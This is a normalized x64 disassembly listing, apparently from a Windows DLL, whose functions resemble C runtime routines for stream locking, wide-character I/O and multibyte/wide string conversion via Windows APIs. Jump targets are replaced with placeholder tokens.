sub_180026850
push rbx
sub rsp 0x20
mov rbx rdx
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_1800259a4
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_180026884
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
jmp [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
jmp sub_1800258a4
sub_180026918
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
test [ rdx + 0x18 ] 0x40
mov rdi rdx
movzx esi cx
jne r-xdata
movsxd rax [ rdi + 0x8 ]
add rax 0xfffffffffffffffe
mov [ rdi + 0x8 ] eax
test eax eax
js r-xdata
mov rcx rdx
call sub_1800268f0
lea rbp [ rw-data ]
lea r12 [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov rdx rdi
movzx ecx si
call sub_180028ad4
mov rax [ rdi ]
mov [ rax ] si
mov r11 rbp
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
add rsp 0x40
pop r12
pop rdi
pop rsi
retn
movsxd rcx [ rdi + 0x8 ]
add rcx 0xfffffffffffffffe
mov [ rdi + 0x8 ] ecx
test ecx ecx
js r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_1800268f0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
mov rcx [ rdi ]
mov [ rcx ] si
jmp r-xdata
mov r11 rbp
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x2
je r-xdata
add [ rdi ] 0x2
movzx eax si
jmp r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_1800268f0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
test [ rbp + 0x8 ] 0x80
je r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x1
je r-xdata
lea rdx [ rsp + 0x24 ]
lea rcx [ rsp + 0x20 ]
movzx r9d si
mov r8d 0x5
call sub_180027408
xor ebx ebx
test eax eax
je r-xdata
mov rcx rdi
call sub_1800268f0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov ebp eax
and ebp 0x1f
imul rbp rbp 0x58
add rbp [ r12 + rbx * 8 ]
cmp [ rsp + 0x20 ] ebx
jle r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax si
jmp r-xdata
lea rbp [ rsp + 0x24 ]
movsx ecx [ rbp ]
mov rdx rdi
call sub_180020df4
mov ecx eax
mov rcx [ rdi ]
mov al [ rbp ]
mov [ rcx ] al
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
inc ebx
inc rbp
cmp ebx [ rsp + 0x20 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
dec [ rdi + 0x8 ]
js r-xdata
sub_180026b30
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x50
xor r12d r12d
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r12b
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_18001db70
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
test rcx rcx
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
call sub_180026cb0
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov [ rcx ] r12w
mov eax r12d
mov r9d 0x1
test rbx rbx
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rbp - 0x20 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp - 0x20 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_18001e6e4
mov [ rax ] 0x2a
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rdi + 0x1 ] r12b
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax r12d
test rbx rbx
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rbp - 0x20 ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x50
pop rbp
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180026cb0
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_18001db70
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180026cf8
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18001db70
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180026d40
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18001db70
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x4
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x4
lea r8 [ rsp + 0x20 ]
mov edx 0x4
mov ecx ebx
call sub_180028368
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_180026dc0
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18001db70
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x80
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x80
lea r8 [ rsp + 0x20 ]
mov edx 0x80
mov ecx ebx
call sub_180028368
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_180026e44
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r12
sub rsp 0x20
test [ rcx + 0x18 ] 0x40
mov rdi rcx
lea r12 [ rw-data ]
lea rsi [ rw-data ]
jne r-xdata
test [ rdi + 0x18 ] 0x40
jne r-xdata
call sub_1800268f0
cmp eax 0xffffffff
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax 0xfffffffffffffffe
mov [ rdi + 0x8 ] eax
test eax eax
js r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xffffffff
je r-xdata
mov r11 rsi
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
mov rcx rdi
call sub_180028c64
mov rcx [ rdi ]
movzx eax [ rcx ]
add rcx 0x2
mov [ rdi ] rcx
jmp r-xdata
test [ rsi + 0x8 ] 0x80
je r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
dec [ rdi + 0x8 ]
js r-xdata
mov rcx rdi
call sub_1800268f0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
dec [ rdi + 0x8 ]
mov ebx 0x1
js r-xdata
mov rcx rdi
call sub_1800268f0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov esi eax
and esi 0x1f
imul rsi rsi 0x58
add rsi [ r12 + rbx * 8 ]
mov rcx rdi
call sub_180028f30
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
test [ r11 + 0x38 ] 0x7f
je r-xdata
mov rcx rdi
call sub_180028f30
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
dec [ rdi + 0x8 ]
mov [ rsp + 0x40 ] cl
js r-xdata
mov eax 0xffff
jmp r-xdata
cmp ecx 0xffffffff
jne r-xdata
mov [ rsp + 0x48 ] cl
movzx ecx cl
call sub_180026cf8
test eax eax
je r-xdata
cmp ecx 0xffffffff
je r-xdata
mov rcx rdi
call sub_180028f30
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x40 ]
movsxd r8 ebx
call sub_180026ca8
cmp eax 0xffffffff
jne r-xdata
dec [ rdi + 0x8 ]
js r-xdata
mov [ rsp + 0x41 ] cl
cmp ecx 0xffffffff
je r-xdata
movzx eax [ rsp + 0x40 ]
jmp r-xdata
call sub_18001e6e4
mov [ rax ] 0x2a
jmp r-xdata
mov rcx rdi
call sub_180028f30
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
mov [ rsp + 0x49 ] cl
mov ebx 0x2
movsx ecx [ rsp + 0x48 ]
mov rdx rdi
call sub_180028ed0
jmp r-xdata
cmp ecx 0xffffffff
jne r-xdata
sub_180027040
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
push r13
push r15
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov r13d 0xffff
mov rdi rdx
movzx ebp cx
mov [ rsp + 0x24 ] cx
cmp cx r13w
je r-xdata
movzx eax r13w
test [ rdx + 0x18 ] 0x1
mov esi 0x2
jne r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
test [ rdx + 0x18 ] 0x80
je r-xdata
test [ rdi + 0x18 ] 0x40
jne r-xdata
mov rcx rdx
call sub_180026628
test [ rdx + 0x18 ] sil
jne r-xdata
mov rax [ rdi + 0x10 ]
add rax rsi
cmp [ rdi ] rax
jae r-xdata
mov rcx rdi
call sub_1800268f0
lea r12 [ rw-data ]
lea r15 [ rw-data ]
cmp eax 0xffffffff
je r-xdata
add [ rdi ] 0xfffffffffffffffe
test [ rdi + 0x18 ] 0x40
mov rax [ rdi ]
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov r11 r12
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
mov [ rax ] bp
jmp r-xdata
cmp [ rax ] bp
je r-xdata
cmp [ rdi + 0x24 ] esi
jb r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_1800268f0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r15 + rbx * 8 ]
jmp r-xdata
add [ rdi + 0x8 ] esi
and [ rdi + 0x18 ] 0xffffffef
or [ rdi + 0x18 ] 0x1
movzx eax bp
jmp r-xdata
add rax rsi
mov [ rdi ] rax
mov [ rdi ] rax
test [ r12 + 0x38 ] 0x7f
je r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
test [ r11 + 0x8 ] 0x80
je r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x40 ]
mov rbp [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r13
pop r12
pop rdi
pop rsi
retn
lea rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x20 ]
movzx r9d bp
mov r8d 0x5
call sub_180027408
test eax eax
jne r-xdata
mov al [ rsp + 0x25 ]
mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] esi
mov [ rsp + 0x29 ] al
jmp r-xdata
mov rcx rdi
call sub_1800268f0
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov r12d eax
and r12d 0x1f
imul r12 r12 0x58
add r12 [ r15 + rbx * 8 ]
mov esi [ rsp + 0x20 ]
mov rax [ rdi + 0x10 ]
movsxd rdx esi
add rdx rax
cmp [ rdi ] rdx
jae r-xdata
lea eax [ rsi - 0x1 ]
movsxd rdx eax
test eax eax
js r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
dec [ rdi ]
mov al [ rsp + rdx + 0x28 ]
dec rdx
mov rcx [ rdi ]
mov [ rcx ] al
jns r-xdata
cmp esi [ rdi + 0x24 ]
jg r-xdata
mov esi [ rsp + 0x20 ]
mov [ rdi ] rdx
sub_180027244
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
test r8 r8
je r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
test rcx rcx
je r-xdata
mov rdx [ rbp + 0x40 ]
lea rcx [ rbp - 0x20 ]
call sub_18001db70
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] 0x0
jne r-xdata
call sub_18001e6e4
mov ebx 0x16
mov [ rax ] ebx
call sub_1800207e0
xor eax eax
jmp r-xdata
and [ rcx ] edx
and [ rbp + 0x28 ] 0x0
mov ecx [ r11 + 0x4 ]
lea rax [ rbp + 0x28 ]
mov [ rsp + 0x38 ] rax
and [ rsp + 0x30 ] 0x0
lea r8 [ rbp + 0x38 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp + 0x38 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rbp + 0x28 ] 0x0
jne r-xdata
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x2a
call sub_18001e6e4
cmp [ rbp - 0x8 ] 0x0
mov eax [ rax ]
je r-xdata
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_18001e6e4
mov ebx 0x22
mov [ rax ] ebx
call sub_1800207e0
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test rdi rdi
je r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_18001e6e4
lea ebx [ rdi + 0x22 ]
mov [ rax ] ebx
call sub_1800207e0
cmp [ rbp - 0x8 ] dil
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_18001c9f0
mov eax ebx
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_18001c9f0
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_18002741c
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
xor r15d r15d
mov rdi r8
mov rsi rdx
mov r13 rcx
mov ebx r15d
mov [ rbp - 0x40 ] r15d
test rcx rcx
je r-xdata
test rdx rdx
jne r-xdata
test r8 r8
jne r-xdata
lea rcx [ rbp - 0x38 ]
mov rdx r9
call sub_18001db70
test r13 r13
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x38 ]
cmp [ rax + 0x14 ] r15d
jne r-xdata
mov r14 [ rbp - 0x38 ]
cmp [ r14 + 0x14 ] r15d
jne r-xdata
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xd8 ]
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rcx [ rbp - 0x40 ]
or rbx 0xffffffffffffffff
mov r8 rsi
mov [ rsp + 0x38 ] rcx
mov ecx [ rax + 0x4 ]
mov [ rsp + 0x30 ] r15
mov r9d ebx
xor edx edx
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] r15
call [ WideCharToMultiByte@IAT ]
cdqe
test rax rax
je r-xdata
movzx eax [ rsi ]
mov rdx r15
test ax ax
je r-xdata
cmp [ r14 + 0x10c ] 0x1
jne r-xdata
test rdi rdi
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x2a
cmp [ rbp - 0x40 ] r15d
jne r-xdata
cmp [ rbp - 0x20 ] r15b
je r-xdata
mov ecx 0xff
mov ecx [ r14 + 0x4 ]
lea rax [ rbp - 0x40 ]
or rbx 0xffffffffffffffff
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r15
mov r9d ebx
mov r8 rsi
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r13
call [ WideCharToMultiByte@IAT ]
movsxd r12 eax
test eax eax
je r-xdata
test rdi rdi
je r-xdata
cmp [ rbp - 0x20 ] r15b
je r-xdata
mov ecx 0xff
mov rax rbx
mov rax [ rbp - 0x28 ]
and [ rax + 0xc8 ] 0xfffffffd
dec rax
jmp r-xdata
mov rax rdx
jmp r-xdata
mov rcx [ rbp - 0x28 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_18001e6e4
mov [ rax ] 0x2a
cmp [ rbp - 0x20 ] r15b
je r-xdata
add rsi 0x2
inc rdx
movzx eax [ rsi ]
test ax ax
jne r-xdata
cmp [ rbp - 0x40 ] r15d
jne r-xdata
cmp [ rbp - 0x40 ] r15d
jne r-xdata
mov ecx [ r14 + 0x4 ]
lea rax [ rbp - 0x40 ]
mov r9d edi
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r15
mov r8 rsi
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r13
call [ WideCharToMultiByte@IAT ]
cdqe
test rax rax
je r-xdata
mov rax rsi
mov rcx rdi
mov al [ rsi ]
mov [ r13 + rbx ] al
movzx eax [ rsi ]
add rsi 0x2
test ax ax
je r-xdata
cmp [ rbp - 0x20 ] r15b
je r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
mov rax [ rbp - 0x28 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp ax cx
ja r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea rax [ r12 - 0x1 ]
jmp r-xdata
cmp [ rbp - 0x40 ] r15d
jne r-xdata
test rcx rcx
je r-xdata
add rax 0x2
dec rcx
jne r-xdata
cmp [ rbp - 0x20 ] r15b
je r-xdata
inc rbx
cmp rbx rdi
jb r-xdata
mov rcx [ rbp - 0x28 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
test rdi rdi
je r-xdata
cmp [ r13 + rax - 0x1 ] r15b
jne r-xdata
cmp [ rax ] r15w
jne r-xdata
cmp [ rax ] r15w
je r-xdata
mov rcx [ rbp - 0x28 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsi ] cx
ja r-xdata
jmp r-xdata
cmp [ rbp - 0x20 ] r15b
je r-xdata
mov ecx [ r14 + 0x4 ]
lea rax [ rbp - 0x40 ]
mov r9d 0x1
mov [ rsp + 0x38 ] rax
mov eax [ r14 + 0x10c ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] eax
lea rax [ rbp - 0x18 ]
mov r8 rsi
xor edx edx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
dec rax
mov rdi rax
sub rdi rsi
sar rdi 0x1
inc rdi
mov rax r12
jmp r-xdata
mov rax [ rbp - 0x28 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rbp - 0x40 ] r15d
jne r-xdata
test eax eax
js r-xdata
cmp eax 0x5
ja r-xdata
movsxd rdx eax
lea rax [ rdx + r12 ]
cmp rax rdi
ja r-xdata
mov rcx r15
test rdx rdx
jle r-xdata
add rsi 0x2
cmp r12 rdi
jb r-xdata
mov al [ rbp + rcx - 0x18 ]
mov [ r13 + r12 ] al
test al al
je r-xdata
cmp [ rbp - 0x20 ] r15b
je r-xdata
inc rcx
inc r12
cmp rcx rdx
jl r-xdata
mov rcx [ rbp - 0x28 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800277b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
xor r12d r12d
mov rax r9
mov rdi r8
mov rbx rdx
mov rsi rcx
test rdx rdx
je r-xdata
test r8 r8
je r-xdata
test r8 r8
je r-xdata
test rdx rdx
je r-xdata
call sub_18001e6e4
mov ebx 0x16
test rcx rcx
je r-xdata
mov [ rdx ] r12b
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
mov r8 [ rsp + 0x50 ]
cmp r8 rdi
cmova r8 rdi
cmp r8 0x7fffffff
ja r-xdata
and [ rcx ] r12
mov r9 [ rsp + 0x58 ]
mov rdx rax
mov rcx rbx
call sub_18002741c
cmp rax 0xffffffffffffffff
jne r-xdata
inc rax
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rsi rsi
je r-xdata
cmp rax rdi
jbe r-xdata
call sub_18001e6e4
mov eax [ rax ]
jmp r-xdata
mov [ rbx ] r12b
mov eax r12d
mov [ rsi ] rax
mov [ rax + rbx - 0x1 ] 0x0
cmp [ rsp + 0x50 ] 0xffffffffffffffff
je r-xdata
mov rax rdi
mov r12d 0x50
mov [ rbx ] r12b
cmp rdi rax
ja r-xdata
call sub_18001e6e4
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_1800207e0
mov eax ebx
jmp r-xdata
sub_1800278bc
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov ebx [ rbp + 0x60 ]
xor edi edi
mov r14 r9
mov r15d r8d
mov [ rbp ] edx
test ebx ebx
jle r-xdata
mov r12d [ rbp + 0x78 ]
mov esi edi
test r12d r12d
jne r-xdata
mov r10d ebx
mov rax r9
neg [ rbp + 0x80 ]
mov r9d ebx
mov r8 r14
sbb edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
and edx 0x8
mov [ rsp + 0x20 ] rdi
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov r12d [ rax + 0x4 ]
mov eax ebx
sub eax r10d
dec eax
cmp eax ebx
lea ebx [ rax + 0x1 ]
jl r-xdata
inc rax
test r10d r10d
jne r-xdata
mov r8 0xffffffffffffff0
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
dec r10d
cmp [ rax ] dil
je r-xdata
or r10d 0xffffffff
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_18001d1f0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d ebx
mov r8 r14
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r14d [ rbp ]
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
mov ecx r14d
mov r9d r13d
mov r8 rdi
mov edx r15d
call [ LCMapStringW@IAT ]
movsxd rsi eax
test eax eax
je r-xdata
call sub_18001d820
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax esi
call sub_18001c80c
mov r8d 0x400
test r8d r15d
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_1800285c0
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax r8
test eax eax
jle r-xdata
mov ecx [ rbp + 0x70 ]
test ecx ecx
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi ecx
jg r-xdata
add rdi 0x10
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r8
ja r-xdata
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x28 ] ecx
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x70 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
test eax eax
jne r-xdata
call sub_18001d820
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_18001c80c
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_1800285c0
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
